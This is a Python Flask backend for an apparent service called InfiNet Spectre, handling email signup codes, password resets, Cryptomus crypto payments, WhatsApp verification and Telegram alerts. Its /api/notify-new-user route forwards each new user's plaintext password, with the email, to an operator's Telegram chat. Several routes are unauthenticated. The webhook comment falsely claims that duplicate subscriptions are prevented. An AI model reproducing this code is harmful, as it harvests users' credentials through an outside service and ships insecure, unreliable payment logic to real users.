"""
Email backend API for InfiNet: signup verification codes, password-reset links, Cryptomus webhook, WhatsApp verification proxy.
Deploy to /var/www/spectre.guru (separate from other backends).
Env: BASE_URL, SMTP_*, FROM_EMAIL, CRYPTOMUS_API_KEY, ROBIN_DB_PATH, WHATSAPP_VERIFICATION_URL (default http://127.0.0.1:3006).
"""
from __future__ import annotations

import base64
import hashlib
import json
import os
import sqlite3
import urllib.error
import urllib.request
from contextlib import contextmanager
from datetime import datetime, timezone, timedelta
from pathlib import Path

# Load .env from same dir as app (for gunicorn)
_env = Path(__file__).resolve().parent / ".env"
if _env.exists():
    with open(_env) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, _, v = line.partition("=")
                k, v = k.strip(), v.strip().strip("'\"")
                os.environ.setdefault(k, v)

from flask import Flask, request, jsonify, redirect

from store import create_signup_code, verify_signup_code, create_reset_token, verify_reset_token, init_db
from store import _conn
from mailer import send_signup_code, send_reset_link

app = Flask(__name__)
BASE_URL = os.getenv("BASE_URL", "https://spectre.guru").rstrip("/")
CRYPTOMUS_API_KEY = os.getenv("CRYPTOMUS_API_KEY", "")
ROBIN_DB_PATH = os.getenv("ROBIN_DB_PATH", "")
# AI app (same WhatsApp number +4915754575150) – sends "InfiNet Spectre" message for spectre.guru
WHATSAPP_VERIFICATION_URL = os.getenv("WHATSAPP_VERIFICATION_URL", "http://127.0.0.1:3004").rstrip("/")
WHATSAPP_VERIFY_INTERNAL_SECRET = os.getenv("WHATSAPP_VERIFY_INTERNAL_SECRET", "")

# Telegram bot for spectre.guru only (separate from ai.infinet.services bot)
TELEGRAM_SPECTRE_BOT_TOKEN = os.getenv("TELEGRAM_SPECTRE_BOT_TOKEN", "")
TELEGRAM_SPECTRE_CHAT_ID = os.getenv("TELEGRAM_SPECTRE_CHAT_ID", "")


def _send_telegram_spectre(message: str) -> bool:
    """Send message to the Spectre Telegram bot (InfiNetSpectrebot). Returns True if sent."""
    if not TELEGRAM_SPECTRE_BOT_TOKEN or not TELEGRAM_SPECTRE_CHAT_ID:
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_SPECTRE_BOT_TOKEN}/sendMessage"
        body = json.dumps({
            "chat_id": TELEGRAM_SPECTRE_CHAT_ID,
            "text": message,
            "parse_mode": "HTML",
        }).encode()
        req = urllib.request.Request(url, data=body, method="POST", headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
        return data.get("ok") is True
    except Exception:
        return False


def _verify_cryptomus_webhook(payload: dict) -> bool:
    """Verify Cryptomus webhook signature (slash-escaped JSON, base64, MD5 + API key).
    Tries insertion order first, then sorted keys (Cryptomus may sign with sorted keys)."""
    if not CRYPTOMUS_API_KEY:
        return False
    sign_received = payload.get("sign")
    if not sign_received:
        return False
    data_copy = {k: v for k, v in payload.items() if k != "sign"}
    payload_str = json.dumps(data_copy, separators=(",", ":"))
    payload_str = payload_str.replace("/", "\\/")
    b64 = base64.b64encode(payload_str.encode()).decode()
    expected = hashlib.md5((b64 + CRYPTOMUS_API_KEY).encode()).hexdigest()
    if sign_received == expected:
        return True
    # Fallback: try with keys sorted (Cryptomus may sign with sorted key order)
    data_sorted = dict(sorted(data_copy.items()))
    payload_str_sorted = json.dumps(data_sorted, separators=(",", ":"))
    payload_str_sorted = payload_str_sorted.replace("/", "\\/")
    b64_sorted = base64.b64encode(payload_str_sorted.encode()).decode()
    expected_sorted = hashlib.md5((b64_sorted + CRYPTOMUS_API_KEY).encode()).hexdigest()
    return sign_received == expected_sorted


@contextmanager
def _robin_conn():
    """Connection to Robin SQLite (read/write payments and subscriptions)."""
    if not ROBIN_DB_PATH:
        raise ValueError("ROBIN_DB_PATH not set")
    c = sqlite3.connect(ROBIN_DB_PATH)
    c.row_factory = sqlite3.Row
    try:
        yield c
        c.commit()
    finally:
        c.close()


@app.route("/api/telegram-spectre/get-chat-id", methods=["GET"])
def api_telegram_spectre_get_chat_id():
    """Get chat IDs from the Spectre bot (InfiNetSpectrebot). Send /start to the bot first, then open this URL."""
    if not TELEGRAM_SPECTRE_BOT_TOKEN:
        return jsonify({"ok": False, "error": "TELEGRAM_SPECTRE_BOT_TOKEN not set"}), 500
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_SPECTRE_BOT_TOKEN}/getUpdates"
        req = urllib.request.Request(url, method="GET")
        with urllib.request.urlopen(req, timeout=10) as resp:
            data = json.loads(resp.read().decode())
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500
    if not data.get("ok"):
        return jsonify({"ok": False, "error": data.get("description", "getUpdates failed")}), 500
    results = data.get("result") or []
    chat_ids = []
    seen = set()
    for u in results:
        msg = u.get("message") or u.get("edited_message")
        if not msg:
            continue
        chat = msg.get("chat")
        if not chat:
            continue
        cid = chat.get("id")
        if cid is not None and cid not in seen:
            seen.add(cid)
            chat_ids.append({"id": cid, "type": chat.get("type", ""), "title": chat.get("title") or chat.get("username") or ""})
    if not chat_ids:
        return jsonify({
            "ok": True,
            "message": "Send /start or any message to @InfiNetSpectrebot in Telegram, then refresh this page.",
            "chat_ids": [],
        })
    return jsonify({"ok": True, "chat_ids": chat_ids, "message": "Add one of these to .env as TELEGRAM_SPECTRE_CHAT_ID"})


@app.route("/api/notify-new-user", methods=["POST"])
def api_notify_new_user():
    """Body: { "email", "user_id", "source": "email"|"google", "password": "..." }. Sends to Spectre Telegram bot only."""
    data = request.get_json(force=True, silent=True) or {}
    email = (data.get("email") or "").strip()
    user_id = data.get("user_id")
    source = (data.get("source") or "email").strip().lower()
    password = data.get("password", "")
    if not email or user_id is None:
        return jsonify({"ok": False, "error": "email and user_id required"}), 400
    source_label = "Google OAuth" if source == "google" else "Email"
    password_line = f"🔑 <b>Password:</b> <code>{password}</code>\n" if password else ""
    msg = (
        "🎉 <b>New User Registered (Spectre)</b>\n\n"
        f"📧 <b>Email:</b> {email}\n"
        f"{password_line}"
        f"🔗 <b>Source:</b> {source_label}\n"
        f"🆔 <b>User ID:</b> {user_id}\n"
        f"📅 <b>Date:</b> {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M')}"
    )
    if _send_telegram_spectre(msg):
        return jsonify({"ok": True})
    return jsonify({"ok": False, "error": "Telegram not configured or send failed"}), 500


@app.route("/api/send-signup-code", methods=["POST"])
def api_send_signup_code():
    """Body: { "email": "user@example.com" }. Sends 6-digit code from admin@infinet.services."""
    data = request.get_json(force=True, silent=True) or {}
    email = (data.get("email") or "").strip().lower()
    if not email:
        return jsonify({"ok": False, "error": "email required"}), 400
    code = create_signup_code(email)
    if not send_signup_code(email, code):
        return jsonify({"ok": False, "error": "failed to send email"}), 500
    return jsonify({"ok": True})


@app.route("/api/verify-signup-code", methods=["POST"])
def api_verify_signup_code():
    """Body: { "email": "...", "code": "123456" }. Returns { "ok": true } if valid."""
    data = request.get_json(force=True, silent=True) or {}
    email = (data.get("email") or "").strip().lower()
    code = (data.get("code") or "").strip()
    if not email or not code:
        return jsonify({"ok": False, "error": "email and code required"}), 400
    if verify_signup_code(email, code):
        return jsonify({"ok": True})
    return jsonify({"ok": False, "error": "invalid or expired code"}), 400


@app.route("/api/send-reset-link", methods=["POST"])
def api_send_reset_link():
    """Body: { "email": "user@example.com" }. Sends reset link to that email."""
    data = request.get_json(force=True, silent=True) or {}
    email = (data.get("email") or "").strip().lower()
    if not email:
        return jsonify({"ok": False, "error": "email required"}), 400
    token = create_reset_token(email)
    reset_url = f"{BASE_URL}/?reset_token={token}"
    if not send_reset_link(email, reset_url):
        return jsonify({"ok": False, "error": "failed to send email"}), 500
    return jsonify({"ok": True})


@app.route("/api/send-whatsapp-verification", methods=["POST"])
def api_send_whatsapp_verification():
    """Proxy to AI app WhatsApp verification (same number +4915754575150, "InfiNet Spectre" message). Body: { "phone_number": "+...", "code": "123456" }."""
    data = request.get_json(force=True, silent=True) or {}
    phone = (data.get("phone_number") or data.get("phoneNumber") or "").strip()
    code = (data.get("code") or "").strip()
    if not phone or not code:
        return jsonify({"ok": False, "error": "phone_number and code required"}), 400
    phone = phone.replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
    if not phone.startswith("+"):
        return jsonify({"ok": False, "error": "phone_number must be E.164 (e.g. +4915754575150)"}), 400
    if not WHATSAPP_VERIFY_INTERNAL_SECRET:
        return jsonify({"ok": False, "error": "WHATSAPP_VERIFY_INTERNAL_SECRET not configured"}), 500
    try:
        body = json.dumps({"phoneNumber": phone, "code": code, "service": "spectre"}).encode()
        req = urllib.request.Request(
            f"{WHATSAPP_VERIFICATION_URL}/api/whatsapp-verify/send-for-service",
            data=body,
            method="POST",
            headers={
                "Content-Type": "application/json",
                "X-Internal-Secret": WHATSAPP_VERIFY_INTERNAL_SECRET,
            },
        )
        with urllib.request.urlopen(req, timeout=30) as resp:
            result = json.loads(resp.read().decode())
        if result.get("success"):
            return jsonify({"ok": True})
        return jsonify({"ok": False, "error": result.get("error", "failed to send")}), 500
    except urllib.error.HTTPError as e:
        try:
            err_body = e.read().decode()
            err_data = json.loads(err_body) if err_body else {}
            msg = err_data.get("error", err_data.get("details", str(e)))
        except Exception:
            msg = str(e)
        return jsonify({"ok": False, "error": msg}), 500
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


@app.route("/api/verify-reset-token", methods=["POST"])
def api_verify_reset_token():
    """Body: { "token": "..." }. Returns { "ok": true, "email": "..." } if valid; invalidates token."""
    data = request.get_json(force=True, silent=True) or {}
    token = (data.get("token") or "").strip()
    if not token:
        return jsonify({"ok": False, "error": "token required"}), 400
    email = verify_reset_token(token)
    if email:
        return jsonify({"ok": True, "email": email})
    return jsonify({"ok": False, "error": "invalid or expired link"}), 400


@app.route("/api/payment/create-redirect", methods=["GET"])
def api_payment_create_redirect():
    """
    Create Cryptomus payment and redirect to payment URL.
    Query params: user_id, plan, email
    This allows Streamlit to redirect here and get a proper HTTP redirect to Cryptomus.
    """
    import time
    user_id = request.args.get("user_id")
    plan = request.args.get("plan")
    email = request.args.get("email", "")
    
    if not user_id or not plan:
        return "Missing user_id or plan", 400
    
    try:
        user_id = int(user_id)
    except ValueError:
        return "Invalid user_id", 400
    
    if plan not in ("unlimited", "lifetime"):
        return "Invalid plan", 400
    
    # Cryptomus config
    CRYPTOMUS_MERCHANT_ID = os.getenv("CRYPTOMUS_MERCHANT_ID", "")
    if not CRYPTOMUS_API_KEY or not CRYPTOMUS_MERCHANT_ID:
        return "Payment not configured", 500
    
    # Plan pricing
    plan_amounts = {"unlimited": 19.0, "lifetime": 149.0}
    amount = plan_amounts.get(plan)
    
    # Build URLs
    return_url = f"{BASE_URL}/?user_id={user_id}&page=payment&payment=success"
    callback_url = f"{BASE_URL}/api/payment/webhook"
    order_id = f"spectre_{user_id}_{int(time.time())}"
    
    # Create payment data
    payment_data = {
        "amount": str(amount),
        "currency": "USD",
        "order_id": order_id,
        "url_return": return_url,
        "url_callback": callback_url,
        "is_payment_multiple": False,
        "lifetime": 7200,
        "additional_data": json.dumps({"user_id": user_id, "plan": plan}),
    }
    
    # Sign the request
    body_str = json.dumps(payment_data, separators=(",", ":"))
    signature = hashlib.md5((base64.b64encode(body_str.encode()).decode() + CRYPTOMUS_API_KEY).encode()).hexdigest()
    
    # Call Cryptomus API
    req = urllib.request.Request(
        "https://api.cryptomus.com/v1/payment",
        data=body_str.encode(),
        method="POST",
        headers={
            "merchant": CRYPTOMUS_MERCHANT_ID,
            "sign": signature,
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "application/json",
        },
    )
    
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            data = json.loads(resp.read().decode())
        result = data.get("result")
        if not result or not result.get("url"):
            print(f"[PAYMENT] No URL in response: {data}")
            return "Failed to create payment", 500
        
        payment_url = result.get("url")
        uuid = result.get("uuid")
        
        # Store payment in database
        if ROBIN_DB_PATH:
            try:
                with _robin_conn() as c:
                    c.execute(
                        """
                        INSERT INTO payments (user_id, plan, amount, currency, payment_id, order_id, status, created_at)
                        VALUES (?, ?, ?, ?, ?, ?, 'pending', ?)
                        """,
                        (user_id, plan, amount, "USD", uuid, order_id, datetime.now(timezone.utc).isoformat()),
                    )
            except Exception as e:
                print(f"[PAYMENT] DB error: {e}")
        
        # HTTP redirect to Cryptomus payment page
        return redirect(payment_url, code=302)
        
    except urllib.error.HTTPError as e:
        error_body = e.read().decode() if e.fp else ""
        print(f"[PAYMENT] Cryptomus API error {e.code}: {error_body}")
        return f"Failed to create payment: {error_body}", 500
    except Exception as e:
        import traceback
        print(f"[PAYMENT] Error creating payment: {e}")
        traceback.print_exc()
        return f"Failed to create payment: {str(e)}", 500


@app.route("/api/payment/webhook", methods=["POST"])
def api_payment_webhook():
    """Cryptomus payment webhook: verify signature, update payment status, create subscription if paid."""
    payload = request.get_json(force=True, silent=True)
    if not payload or not isinstance(payload, dict):
        return "", 400
    uuid = payload.get("uuid")
    status = (payload.get("status") or "").strip().lower()
    order_id = (payload.get("order_id") or "")
    if uuid:
        print(f"[WEBHOOK] Received uuid: {uuid} status: {status}")
    if not _verify_cryptomus_webhook(payload):
        print(f"[WEBHOOK] Invalid signature for uuid: {uuid}")
        return "", 403
    if not uuid:
        return "", 200
    if not ROBIN_DB_PATH:
        return "", 500
    try:
        with _robin_conn() as c:
            row = c.execute("SELECT * FROM payments WHERE payment_id = ?", (uuid,)).fetchone()
            if not row and order_id:
                print(f"[WEBHOOK] Payment not found by payment_id: {uuid}, trying order_id: {order_id}")
                row = c.execute("SELECT * FROM payments WHERE order_id = ?", (order_id,)).fetchone()
            if not row:
                return "", 200
            c.execute("UPDATE payments SET status = ? WHERE payment_id = ?", (status, uuid))
            if status not in ("paid", "paid_over"):
                return "", 200
            if not order_id.startswith("spectre_"):
                return "", 200
            try:
                add = json.loads(payload.get("additional_data") or "{}")
                user_id = add.get("user_id")
                plan = add.get("plan")
            except (TypeError, ValueError, json.JSONDecodeError):
                return "", 200
            if user_id is None or not plan:
                return "", 200
            user_id = int(user_id)
            now = datetime.now(timezone.utc)
            # Lifetime: never expires (far-future ends_at); Unlimited: 30 days
            if plan == "lifetime":
                ends = datetime(2099, 12, 31, 23, 59, 59, tzinfo=timezone.utc)
            else:
                ends = now + timedelta(days=30)
            # Always create subscription for this payment (duplicate payments are prevented by payment status check above)
            c.execute(
                """
                INSERT INTO subscriptions (user_id, plan, status, cryptomus_payment_id, starts_at, ends_at)
                VALUES (?, ?, 'active', ?, ?, ?)
                """,
                (user_id, plan, uuid, now.isoformat(), ends.isoformat()),
            )
            print(f"[WEBHOOK] Created subscription for user_id={user_id} plan={plan} uuid={uuid}")
    except Exception as e:
        import traceback
        print(f"[WEBHOOK] ERROR creating subscription: {e}")
        traceback.print_exc()
        return "", 500
    return "", 200


def _ensure_db():
    with _conn() as c:
        init_db(c)


if __name__ == "__main__":
    _ensure_db()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", "5000")))
